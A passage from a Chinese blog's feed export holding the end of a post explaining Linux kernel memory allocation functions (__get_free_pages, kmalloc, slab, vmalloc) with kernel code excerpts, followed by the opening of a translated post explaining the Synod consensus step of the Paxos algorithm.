class=&quot;keyword&quot;&gt;int&lt;/span&gt; gfp_mask)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//Allocate a single page and return a virtual address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; __&lt;span class=&quot;title&quot;&gt;get_free_pages&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; gfp_mask, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; order)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//Allocate 2order number of pages and return a virtual address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; page * __&lt;span class=&quot;title&quot;&gt;get_dma_pages&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; gfp_mask, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; order)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//Allocate 2order number of pages from the DMA zone and return a struct page&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以_ _get_free_pages为例看看其函数间调用关系：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; __get_free_pages(&lt;span class=&quot;keyword&quot;&gt;gfp_t&lt;/span&gt; gfp_mask, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; order)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         page = alloc_pages(gfp_mask, order);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; alloc_pages(gfp_mask, order) \              alloc_pages_node(numa_node_id(), gfp_mask, order)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; page *&lt;span class=&quot;title&quot;&gt;alloc_pages_node&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; nid, gfp_t gfp_mask,&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; order)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;         return __alloc_pages_node(nid, gfp_mask, order);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; page *  __alloc_pages_node(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; nid, &lt;span class=&quot;keyword&quot;&gt;gfp_t&lt;/span&gt; gfp_mask, &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; order)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       return __alloc_pages(gfp_mask, order, node_zonelist(nid, gfp_mask));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最终&lt;em&gt;_ _get_free_page&lt;/em&gt;会调用&lt;em&gt;_ _alloc_pages&lt;/em&gt;函数分配页面。&lt;em&gt;_ _alloc_pages&lt;/em&gt;是所有页面分配函数的核心函数，最终都会调用到这个函数，它会返回一个&lt;em&gt;struct page&lt;/em&gt;结构。&lt;/p&gt;
&lt;p&gt;在了解与其它内存分配函数的区别前，先说明下面这个概念&lt;/p&gt;
&lt;p&gt;前文说过3G-4G属于内核空间，然后在内核空间中又有进一步划分。&lt;br&gt;&lt;em&gt;3G~vmalloc_start&lt;/em&gt;这段地址是物理内存映射区域，该区域包括了内核镜像，mem_map数组等等。在&lt;em&gt;vmalloc_start~vmalloc_end&lt;/em&gt;属于vmalloc区域（vmalloc下文会说),&lt;em&gt;vmalloc_end&lt;/em&gt;的位置接近4G(最后系统会保留一片128KB大小的区域专用页面映射). 那这个&lt;em&gt;vmalloc_start&lt;/em&gt;的位置又在哪呢？假设我们使用的系统内存是512M,&lt;em&gt;vmalloc_start&lt;/em&gt;就在应在3G+512M附近（说”附近”因为是在物理内存映射区与&lt;em&gt;vmalloc_start&lt;/em&gt;期间还会存在一个8M大小的gap来防止跃界）.当然实际情况都比这个大，甚至都4G，8G，16G..但我们使用的CPU都是64位的，可寻址空间就不止4G了，这个理论仍然有效。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;_ _get_free_page&lt;/em&gt;系列函数申请的内存位于物理内存映射区域，在物理上是连续的，注意，函数返回的是虚拟地址，其与物理地址有一个固定的偏移，存在比较简单的转换关系，&lt;em&gt;virt_to_phys()&lt;/em&gt;函数做的就是这件事：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; __pa(x) ((unsigned long)(x)-PAGE_OFFSET)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;virt_to_phys&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;volatile&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; * address)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     　return __pa(address);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意，这里的PAGE_OFFSET指的就是3G(针对x86系统).&lt;/p&gt;
&lt;p&gt;与页面分配系函数一样，&lt;em&gt;kmalloc&lt;/em&gt;函数申请的内存也处于物理内存映射区域，在物理上是连续的。&lt;em&gt;Kmalloc&lt;/em&gt;函数是slab分配器提供的分配内存的接口，slab是什么？这里不去具体讲slab分配原理,想详细了解的slab可以参考&lt;a href=&quot;https://www.kernel.org/doc/gorman/html/understand/understand011.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;这里&lt;/a&gt;. 简单说明一下：slab是为了避免内部碎片使得一个页面内包含的众多小块内存可独立被分配使用，是为分配小内存提供的一种高效机制。追踪kmalloc函数，可以发现，它最终还是调用前面提到的&lt;br&gt;&lt;em&gt;_ _alloc_pages()&lt;/em&gt;函数。既然&lt;em&gt;kmalloc&lt;/em&gt;基于slab实现，而slab分配机制又不是独立的，本身也是在以页面为单位分配的基础上来划分更细粒度的内存供调用者使用。就是说系统先用页分配器分配以页为最小单位的连续物理地 址，然后&lt;em&gt;kmalloc&lt;/em&gt;再在这上面根据调用者的需要进行切分。&lt;/p&gt;
&lt;p&gt;既然slab是为了解决内部碎片的问题，那想必也有一个解决外部碎片的机制(注：外部分片是指系统虽有足够的内存，但却是分散的碎片，无法满足对大块“连续内存”的需求)。没错，伙伴关系系统就是这么一个机制。伙伴关系系统提供&lt;em&gt;vmalloc&lt;/em&gt;来分配非连续内存,其分配的地址限于上述说的&lt;em&gt;vmalloc_start~vmalloc_end&lt;/em&gt;之间。这些虚拟地址与物理内存没有简单的位移关系，必须通过内核页表才可转换为物理地址或物理页。它们有可能尚未被映射，在发生缺页时才真正分配物理页面。&lt;/p&gt;
&lt;p&gt;说到这里，还有一个关键函数没提，&lt;em&gt;kmem_cache_alloc&lt;/em&gt;。 &lt;em&gt;kmem_cache_alloc&lt;/em&gt;也是基于slab分配器的一种内存分配方式，适用于反复分配同一大小内存块的场合。首先用&lt;em&gt;kmem_cache_create&lt;/em&gt;创建一个高速缓存区域，然后用&lt;em&gt;kmem_cache_alloc&lt;/em&gt;从该高速缓存区域获取新的内存块。&lt;em&gt;kmem_cache_alloc&lt;/em&gt;分配固定大小的内存块。&lt;em&gt;kmalloc&lt;/em&gt;则是在&lt;em&gt;kmem_cache_create&lt;/em&gt;的基础实现的，其分配动态大小的内存块，查看源码可以发现&lt;em&gt;kmalloc&lt;/em&gt;函数中会有一段代码块转向调用&lt;em&gt;kmem_cache_alloc&lt;/em&gt;：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;inline&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *&lt;span class=&quot;title&quot;&gt;kmalloc&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(size_t size, gfp_t flags)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (__builtin_constant_p(size)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; CACHE(x) \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;meta-keyword&quot;&gt;if&lt;/span&gt; (size &amp;lt;= x) \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  goto found; \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &lt;span class=&quot;meta-keyword&quot;&gt;else&lt;/span&gt; \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  i++;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;kmalloc_sizes.h&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;undef&lt;/span&gt; CACHE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &lt;span class=&quot;keyword&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; __you_cannot_kmalloc_that_much(&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  __you_cannot_kmalloc_that_much();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      found:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              return kmem_cache_alloc((flags &amp;amp; GFP_DMA) ?&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  malloc_sizes[i].cs_dmacachep :&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  malloc_sizes[i].cs_cachep, flags);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          return __kmalloc(size, flags);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;内核空间常用的内存分配函数就此说完了，实际除了这些常用的，还有其它的分配函数，在此简单说明一下。如，&lt;em&gt;dma_alloc_coherent&lt;/em&gt;，基于&lt;em&gt;_ _alloc_pages&lt;/em&gt;实现，适用于DMA操作；&lt;em&gt;ioremap&lt;/em&gt;,实现已知物理地址到虚拟地址的映射，适用于物理地址已经的场合，如设备驱动；&lt;em&gt;alloc_bootmem&lt;/em&gt;，在启动内核时，预留一段内存，内核看不见，对内存管理要求较高。&lt;/p&gt;
&lt;p&gt;完&lt;/p&gt;
&lt;p&gt;待续&lt;/p&gt;
&lt;h3 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h3&gt;&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;仅为学习使用，未经博主同意，请勿转载&lt;/p&gt;
&lt;p&gt;本文地址： &lt;a href=&quot;http://www.chongh.wiki/blog/2016/05/03/linux-memory-alloc/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/05/03/linux-memory-alloc/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;作者 [ 新浪微博: &lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;没有目录，希望能一口气读完&lt;/p&gt;
&lt;p&gt;为了写一个用户层程序，你也许会声明一个全局变量，这个全局变量可能是一个int类型也可能是一个数组，而声明之后你有可能会先初始化它，也有可能放在之后用到它的时候再初始化。除此之外，你有可能会选择在函数内部去声明局部变量，又或者为变量动态申请内存。&lt;/p&gt;
    
    </summary>
    
      <category term="operating-system" scheme="http://yoursite.com/categories/operating-system/"/>
    
    
      <category term="System" scheme="http://yoursite.com/tags/System/"/>
    
      <category term="Kernel" scheme="http://yoursite.com/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>深入理解Paxos算法(二)</title>
    <link href="http://yoursite.com/blog/2016/04/29/understand-paxos2/"/>
    <id>http://yoursite.com/blog/2016/04/29/understand-paxos2/</id>
    <published>2016-04-29T15:58:58.000Z</published>
    <updated>2016-04-30T03:40:59.000Z</updated>
    
    <content type="html">&lt;p&gt;&lt;a href=&quot;http://www.chongh.wiki/blog/2016/04/28/understand-paxos1/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;上一篇&lt;/a&gt;博客对Paxos算法做了大致的介绍。快速回顾一下： Paxos算法实现了一种可恢复的分布式日志，日志可以添加条目并为每个条目分配一个独有(递增)的索引。算法由三部分组成：决策者选举算法，条目共识算法(称为Synod算法)和管理日志协议。在这篇博客中，我会详细讨论Synod算法。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h3 id=&quot;背景知识&quot;&gt;&lt;a href=&quot;#背景知识&quot; class=&quot;headerlink&quot; title=&quot;背景知识&quot;&gt;&lt;/a&gt;背景知识&lt;/h3&gt;&lt;p&gt;在开始之前做以下声明：这篇博客描述的Paxos算法是来源于原论文中的最基本的形式。当然也有许多基于Paxos的相关优化算法，但我觉得聊那些优化算法会扰乱我们对整个算法的理解。&lt;/p&gt;
&lt;p&gt;Synod算法是Paxos的核心。针对每个日志索引，Synod算法都会单独执行一次，e.g.，为获取日志中的第一个条目执行一次，又为日志中的第二个条目执行第二次，如此往复。多个Synod算法可以并发执行而不会相互影响各自的结果。在下文中，术语”Synod实例”表示： 针对一个特定的索引，Synod算法的一次执行。&lt;/p&gt;
&lt;p&gt;简单地说，Synod算法是一种共识算法，用来保证：a)所有参与的节点都有相同的输出值，b)输出值是由一些节点投票选出的结果(而不是任意的值),c)如果能保证足够的节点正常地相互通信，算法最终能正常结束。算法这样构造，以便让所有的节点都能提案一个值，其动态性保证了那些提案的值中只有一个能被选出。然而，也存在这种情况：不同的时间不同的节点会提案出许多值，导致算法永远在执行，无法结束。为了加快Synod算法的结束，我们可以限制节点只能把值提案给Paxos算法的决策者。当只有一个决策者的时候，算法很快就能结束运行了。当然，算法的建立之初是为了能支持任意节点都能提案值，尽管会有多个决策者，达成共识的输出值最终仍然会保持一致性。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注]:这里说的提案出许多值是因为没有决策者或者多于一个决策者导致的
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&quot;Synod算法：一个菜鸟的视角&quot;&gt;&lt;a href=&quot;#Synod算法：一个菜鸟的视角&quot; class=&quot;headerlink&quot; title=&quot;Synod算法：一个菜鸟的视角&quot;&gt;&lt;/a&gt;Synod算法：一个菜鸟的视角&lt;/h3&gt;&lt;p&gt;简单起见，我们暂时不考虑每个日志索引都会执行一次Synod算法，只考虑单个Synod实例。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注]：这里只用日志中的一个索引选取条目过程来理解Synod算法，多个条目的添加原理一样
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Synod算法由许多的选举组成，每一次选举又分为三个阶段:初始化，投票和决议。每次选举都分配唯一的编号，由其中一个节点管理。选举的编号代表它们的优先级，比如，编号为5的选举A优先级要低于编号为6的选举B.&lt;/p&gt;
&lt;p&gt;我们来谈谈每个阶段的细节。在初始化阶段，管理节点通知所有的节点会有一次新的选举，然后等着它们同意参与选举过程(而它们此时可能正在参与一个优先级更高的选举，而拒绝参与优先级更低的那一个)。补充一下，就是说如果它们同意成为此次选举的参与者，同时也会告诉管理节点哪个值应该被选出作为选举的结果。只要管理节点收到信息说节点的多数派都会参与此次选举，就开始投票阶段。接着管理节点从那些参与者发送的提案中选出一个值又发送给参与者。在还没有开始下一个新的选举之前，每个参与节点又根据这次的提案值进行投票。如果有更新的选举开始，参与节点就忽略更老的选举中的信息。最后，在决议阶段，如果管理节点收到所有参与节点的绿灯信号，管理节点就告知所有节点系统中已经决策出的值。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注：这里的绿灯信号表示同意]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在更详细地讨论之前，我们先分析一下上文中的描述。存在这种可能性：不同的选举过程并发执行（注意:这里和Synod算法的并发执行有所区别)，因此，其中一个选举过程可能永远不会结束。e.g.，如果一个选举已经开始了，到了投票阶段的时候另一个选举也开始了，第一个选举过程就有可能永远不会完成决议阶段，因为这时所有的参与节点都会参与更新的一次选举而在投票阶段就会忽略更老的选举。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注：Synod算法的并发执行针对的对象是日志中不同的索引，选举的并发对象是单个索引的多次选举过程]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;根据以上所述，每次选举过程都有一个管理节点。不管哪个节点在管理选举(只要是单个节点管理每次选举)，算法都能保证一致性. 然而，为了保证最后能做出决议，只有Paxos算法中的决策者才能担任选举过程的管理节点。只要Paxos算法中只存在一个决策者，那在选举过程中就只有一个管理者管理所有的选举，因此每次只有一个单独的选举过程,这样一来，Synod算法很快就能终止。如果有多个节点认为自己就是Paxos算法中的决策者，那就会初始化许多的选举过程。然而，Synod算法要么不终止，要么终止的时候所有的节点都会在同一个值上达成共识，这样一致性就永远能保证。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[译者注：这里指的管理者只有一个的情况下，是指管理者不会同时初始化多次选举带来算法无法终止的问题，并非管理者至始至终只能发起一次选举过程；当然也存在多个管理者的情况，这样Synod算法就无法终止了，但是一致性仍然能保证]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在讨论细节之前再说最后一点，考虑以下情形：选举X正在执行，在投票阶段，节点U发送了提案值。在选举X结束之前，一个新的选举开始了，节点U被要求参与这次新的选举。只要新的选举比选举X优先级更高，节点U就会参与新的选举。我们假设新的选举过程比选举X更早结束。这样一来，新选举中的管理者就会做出一次决议。如果这时选举X还没有结束，那在它结束的时候做出的决议就必须和这次新的选举决议出的值保持一致，不然就会违背Synod算法的一致性原则了。下面我们来探讨一些机制，来确保所有的选举都会产生相同的决议值，目前我们就当这个性质已经能保证了，在我看来这才是Synod算法的核心。&lt;/p&gt;
